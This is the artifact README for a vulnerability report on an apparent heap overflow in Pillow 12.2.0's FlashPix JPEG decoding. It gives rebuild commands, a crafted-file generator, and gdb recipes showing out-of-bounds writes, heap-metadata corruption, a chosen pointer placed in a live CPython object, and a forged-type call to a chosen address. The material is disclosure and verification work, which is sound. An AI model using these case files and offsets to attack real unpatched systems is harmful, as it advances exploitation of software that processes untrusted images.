# Pillow2Shell W1 — real-path consumer check artifacts

Supporting material for `reports/pillow2shell-consumer-reality.md`
(CVE-2026-112398). No network probe: the two Pillow sdists were fetched from
PyPI as provisioning; all runs were local processes.

Files:

- `make_case.py` — builds a real OLE2/FlashPix file from Pillow 12.2.0's
  `Tests/images/input_bw_five_bands.fpx` by replacing three equal-size streams
  with `olefile.write_stream`: a 2-band LA property set, a one-tile JPEG header
  (`internal_color_conversion=1` -> `jpegmode=None`), and a 256-wide 4-component
  CMYK JPEG whose decoded bytes are chosen by its coefficients.
  Usage: `python3 make_case.py OUT.JPX JPEG_WIDTH FILL16 TILE_W TILE_H`.
  Optional 6th arg: 512 hex chars = 256 desired raw decoded row bytes (the
  encoder writes `0xff - desired`); optional 7th: JPEG height (default 8).
  The uniform-fill invocation still regenerates `case64.fpx` byte-identically.
- `case.fpx` — 16x16 tile, input fill `0x5a` (decodes `0xa5`).
- `case5a.fpx` — 16x16 tile, input fill `0xa5` (decodes chosen `0x5a`).
- `case64.fpx` — 64x64 tile, input fill `0xa5`; accepted by both 12.2.0 and
  13.0.0 front ends, so it isolates the decoder guard in the fixed build.
- `observe.gdb`, `observe200.gdb` — hardware-watchpoint scripts for the first
  past-end byte and for offset +200, respectively.
- `load_v12.log`, `load_v13.log` — vulnerable load succeeds; fixed load fails
  with `OSError: broken data stream when reading image file`.
- `gdb_watch32.log`, `gdb_watch200.log` — watchpoint fires from
  `libjpeg.so.8` with `0x00 -> 90 'Z'` at +32 of a 32-byte buffer and +200 of
  a 128-byte buffer.

Rebuild:

```
CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
LDFLAGS="-fsanitize=address" python3 -m pip install --no-binary :all: \
  --no-deps --target /tmp/pw2-w1/v12 pillow-12.2.0.tar.gz
# same for 13.0.0 -> /tmp/pw2-w1/v13
PYTHONPATH=/tmp/pw2-w1/v12 LD_PRELOAD=$(gcc -print-file-name=libasan.so) \
  ASAN_OPTIONS=detect_leaks=0 python3 -c \
  'from PIL import Image; Image.open("case64.fpx").load()'
```

ASan alone stays silent because the host `libjpeg.so.8` is uninstrumented;
the gdb logs are the corruption detector. This W1 section makes no
object-neighbour or pointer claim; the W3 section below does.

Case-file SHA-256 (regeneration of `case64.fpx` is byte-identical):

```
8bd3fcd3a1b6b8515617da9964b5c57913bb169c103767f9ca5ce95aac8128d4  case.fpx
32ab85471e9fefd9dd03be540e7fca006840ee870c672e2e4b11dec62ea4dbd1  case5a.fpx
0b258df0b41064a975aed808b32866157ffb7cc60bfe29e8a1c00db9902fa9c0  case64.fpx
```

In-library ASan evidence (ASan-instrumented libjpeg-turbo 2.1.5.1, `WITH_SIMD=0`):

- `asan_libjpeg_v12.log` — `heap-buffer-overflow`, `WRITE of size 1` exactly
  0 bytes after the 128-byte tile buffer, stack
  `null_convert` -> `sep_upsample` -> `jpeg_read_scanlines` ->
  `ImagingJpegDecode src/libImaging/JpegDecode.c:252`, allocation from
  `_setimage src/decode.c:226`.
- `asan_libjpeg_v13_fixed.log` — same file, fixed build: opens, then load
  fails with `OSError: broken data stream when reading image file`, no ASan
  report.
- `build12ja.log`, `build13ja.log`, `jpeg-cmake.log`, `jpeg-make.log` —
  build records with `JPEG_ROOT=/tmp/pw2-w1/jpegasan` and the instrumented
  libjpeg prefix.

Rebuild the in-library ASan case (instrumented libjpeg). `_imaging.so` has no
RUNPATH, so bare `ldd` can show the system `libjpeg.so.62` even with
`JPEG_ROOT`. Export `LD_LIBRARY_PATH` both when checking the loader and when
running the case; the witness needed the same export on its own rebuild:

```
cmake -S <libjpeg-turbo-2.1.5.1> -B /tmp/pw2-w1/jpeg-build \
  -DCMAKE_INSTALL_PREFIX=/tmp/pw2-w1/jpegasan -DWITH_SIMD=0 \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
cmake --build /tmp/pw2-w1/jpeg-build --target install
CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
LDFLAGS="-fsanitize=address" JPEG_ROOT=/tmp/pw2-w1/jpegasan \
  python3 -m pip install --no-binary :all: --no-deps \
  --target /tmp/pw2-w1/v12ja /tmp/pw2-dl/pillow-12.2.0.tar.gz
LD_LIBRARY_PATH=/tmp/pw2-w1/jpegasan/lib ldd /tmp/pw2-w1/v12ja/PIL/_imaging*.so
LD_LIBRARY_PATH=/tmp/pw2-w1/jpegasan/lib PYTHONPATH=/tmp/pw2-w1/v12ja \
  LD_PRELOAD=$(gcc -print-file-name=libasan.so) ASAN_OPTIONS=detect_leaks=0 \
  python3 -c 'from PIL import Image; Image.open("case64.fpx").load()'
```

Use `/tmp/pw2-w1/libjpeg-turbo-2.1.5.1` source layout if following W1's paths;
`CMAKE_INSTALL_LIBDIR=lib` in `jpeg-cmake.log` confirms the exported `lib`
directory name.

## W2 — plain glibc heap evidence (2026-11-21)

A plain, no-sanitizer Pillow 12.2.0 build (`/tmp/pw2-w2/v12plain`, links host
`libjpeg.so.8`) makes the tile buffer's `calloc` come from glibc, so the
past-end bytes hit real heap metadata rather than an ASan redzone. On
`case64.fpx`:

- `glibc_raw_layout_v12.log` — non-PIE python3.12, brk heap, buffer chunk size
  field `0x91` (144-byte chunk, 136 usable).
- `glibc_first_store_v12.log` — hardware watchpoint at `buffer+128` fires with
  `0x00 -> 90 'Z'` in `libjpeg.so.8`, stack through pinned
  `ImagingJpegDecode src/libImaging/JpegDecode.c:252`.
- `glibc_metadata_overwrite_v12.log` — after the row write the next chunk's
  size field is `0x5a5a5a5a5a5a5a5a` and its user bytes are all `0x5a`.
- `glibc_live_chunks_v12.log` — the overrun crosses two live chunks (32 bytes
  at `buffer+144`, 992 bytes at `buffer+176`).
- `glibc_plain_run_run[1-5].log` — 5/5 runs print `OK (90, 90, 90, 90)` then
  exit rc 139. `glibc_malloc_check_v12.log` — `MALLOC_CHECK_=3`, rc 134,
  `corrupted double-linked list`.
- `glibc_crashbt_v12.log` — SIGSEGV in `PyGC_Collect()` / `Py_FinalizeEx()`.
- `plain_v13_fixed_control.log` — plain 13.0.0 on the same file raises
  `OSError` and exits rc 1, no crash. `build12_plain.log`,
  `build13_plain.log` — build records.

Rebuild the plain case:

```
python3 -m pip install --no-binary :all: --no-deps \
  --target /tmp/pw2-w2/v12plain /tmp/pw2-dl/pillow-12.2.0.tar.gz
PYTHONPATH=/tmp/pw2-w2/v12plain python3 -c \
  'from PIL import Image; Image.open("case64.fpx").load()'
```

W2 established chosen bytes plus live heap-metadata corruption and a
deterministic abort; W3 below adds a real Python object's pointer field.
No valid-pointer value, PC, marker or control-flow diversion was observed.

## W3 — CPython object field overwrite (2026-11-21)

- `glibc_pyobject_type_v12.log` — in the unmodified plain build, the 992-byte
  chunk at `buffer+176` has `ob_refcnt=2` and `ob_type = &PyUnicode_Type` at
  `ImagingJpegDecode` entry. A hardware watchpoint on `buffer+191` (last byte
  of `ob_type`) catches `0x00 -> 90 'Z'` from `libjpeg.so.8` through pinned
  `JpegDecode.c:252`; after the row both words read `0x5a5a...`. Chosen bytes
  replace a live Python object's pointer-typed field; the value is the
  repeated byte, not a chosen valid address.
- `glibc_pyobject_alloc_stack.log` — separate LD_PRELOAD allocator trace with
  shifted layout: the neighbour chunk came from `PyObject_Malloc` /
  `_PyObject_NewVar` / `_PyCode_New`. Supporting only; the `PyUnicode_Type`
  identification above is the direct observation.

Reproduce the direct observation with the plain build and `case64.fpx`:

```
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch \
  -ex 'set breakpoint pending on' -ex 'break ImagingJpegDecode' -ex 'run' \
  -ex 'set $b=(unsigned char*)state->buffer' -ex 'p &PyUnicode_Type' \
  -ex 'x/4gx $b+176' -ex 'watch *(unsigned char*)($b+191)' -ex 'continue' \
  -ex 'printf "TYPE=%lx\n",*(unsigned long*)($b+184)' -ex 'x/4gx $b+176' \
  --args python3 -c 'from PIL import Image; Image.open("case64.fpx").load()'
```

## W4 — distinct chosen bytes and chosen valid pointer (2026-11-21)

New artifacts: `case_ptr64.fpx` (SHA-256
`cf7787a35747ae88b65f22cf8187f8e7012812f9739cd7985d00365dd15c3bc6`),
`pattern_full.hex` / `pattern2.hex`, `rawscan.c` (raw libjpeg scanline
calibrator), `firstrow.gdb` / `firstrow.log`, `ptr_store.gdb` / `ptr_store.log`,
`full_restore_clean.gdb` / `full64_restore_clean.log`,
`full_restore_type.gdb` / `full64_restore_type.log`, `crash_disasm.log`,
`run64_[1-5].log`, `plain_v13_pattern_control.log`,
`case_long.fpx` / `pattern_long.hex`, `full_restore_long.gdb` /
`full64_restore_long.log`.

Regenerate the case (Pillow 12.2.0 must be on PYTHONPATH for JPEG encoding):

```
PYTHONPATH=/tmp/pw2-w2/v12plain python3 make_case.py case_ptr64.fpx 256 0xa5 64 64 \
  "$(cat pattern_full.hex)" 64
```

`pattern_full.hex` puts chosen `0x11` at row offsets 128-135 and the
little-endian valid address `0xa2d260` (`&PyCode_Type` in this plain build) at
184-191, the `ob_type` of the live `PyUnicodeObject` at `buffer+176`.

Catch the chosen-pointer store in the plain v12.2.0 build:

```
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x ptr_store.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_ptr64.fpx").load()'
```

Expected: `Old value = 192 '\300'`, `New value = 96 '`'` at `buffer+184` from
`libjpeg.so.8`, stack through pinned `JpegDecode.c:252`. The absolute brk
address shifts with cwd/environment (`0xd32bb0` in the recorded log,
`0xd32c10` when running from the lane); offsets and byte values are invariant.

Causal differential on the same byte-identical file (both scripts snapshot the
full 896-byte past-end span before the write and restore it after the decoder
call):

```
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x full_restore_clean.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_ptr64.fpx").load(); print("LOAD_OK")'
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x full_restore_type.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_ptr64.fpx").load(); print("LOAD_OK")'
```

First run exits normally after `LOAD_OK`; second re-applies only
`ob_type=0xa2d260` and faults at `0x447239` in `Py_FinalizeEx()`. That is a
type-confusion fault, not execution of chosen code: no marker, PC control or
chosen-code call was observed. Plain non-gdb runs: 5/5 `LOAD_OK` then rc 134
`corrupted size vs. prev_size`; plain fixed 13.0.0 raises `OSError`, rc 1.
W3 (#926) and W4 were replayed by the witness in W74 (#947) from its own
pinned builds: ESTABLISHED AS CLAIMED at the labeled grade, no grade change.

Type-flag differential (same isolation, byte-identical file except the 8
pointer bytes): regenerate with `pattern_long.hex` to get `case_long.fpx`
(SHA-256 `be85c9a647b43318547591d35fc60310befe2505b08d6fb1728512eb6331c05f`),
whose chosen `ob_type` is `0xa3bf20` (`&PyLong_Type`, non-GC) instead of
`0xa2d260` (`&PyCode_Type`, GC-tracked):

```
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x full_restore_long.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_long.fpx").load(); print("LOAD_OK")'
```

It prints `LOAD_OK` and exits cleanly, while the GC-tracked pointer faults
under the same restore. The GC-flag mechanism is an inference; the
differential is observed. No chosen-code call, marker or PC control.
W74 (#947) also replayed the long-type differential from the witness's own
builds: ESTABLISHED AS CLAIMED with the GC-flag mechanism still INFERENCE.

## W5 — forged-type slot call to a chosen address (2026-11-21)

New artifacts: `case_fake.fpx` (SHA-256
`6c59dd01bc9c8a77e7d84d77b8ef8b79f77d2b3ef7678b880604098f80ffedea`),
`pattern_fake.hex`, `forged_type_call.gdb`/`.log`,
`forged_type_control.gdb`/`.log`, `forged_type_self.gdb`/`.log`.

`pattern_fake.hex` is `pattern_full.hex` with bytes 184-191 set to
`90 2f d3 00 00 00 00 00` (`0xd32f90`). Regenerate with:

```
PYTHONPATH=/tmp/pw2-w2/v12plain python3 make_case.py case_fake.fpx 256 0xa5 64 64 \
  "$(cat pattern_fake.hex)" 64
```

The stronger run, where the OOB write itself supplies the pointer:

```
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x forged_type_self.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_fake.fpx").load()'
PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x forged_type_control.gdb --args python3 -c \
  'from PIL import Image; Image.open("case_fake.fpx").load()'
```

Any pinned plain v12.2.0 build works. W6 regenerated both logs from a fresh
build:

```
python3 -m pip install --no-binary :all: --no-deps \
  --target /tmp/pw2-w6/v12plain /tmp/pw2-dl/pillow-12.2.0.tar.gz
```

and a byte-identical `case_fake.fpx`.

Expected (`forged_type_self.log`, fresh W6 build):
`AFTER_DECODE type=d32f90 fake=d32f90`, `OBTYPE_FROM_OOB=d32f90
forged_slot=45e6e6 MATCH=1`, then
`Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()` after the gdb-invoked
`_Py_Dealloc`. Both scripts take the fake-type address from the POST-decode
`*(unsigned long*)($b+184)` — the pointer the image's OOB write supplies —
not from a fixed `buffer+512`. The tile buffer's brk address varies by host
(`0xd32d90` in W5, `0xd32cc0` in W6); the image-supplied `0xd32f90` and the
marker address do not, so the recipe no longer depends on that offset. The
script stages a 416-byte copy of `PyUnicode_Type` at the OOB-derived address
(inside the OOB span, `sizeof(PyTypeObject)=416`, `tp_dealloc` at offset 48 in
Python 3.12) with only `tp_dealloc` changed to `0x45e6e6`, and snapshots the
past-end span in two pieces so the OOB-written `ob_type` survives the restore.
`forged_type_control.gdb` stages the same copy at the same address with the
real `tp_dealloc` (`0x5a8450`): the marker breakpoint is NOT hit and the
process faults in `PyObject_Free()` instead.

Limit: the deallocation call is invoked from gdb, the fake type is staged by
gdb, the build is non-PIE with a deterministic brk address, and the marker is
an existing static function address. No injected code, natural trigger, PC
write or ASLR leak was demonstrated; grade stays ◐.
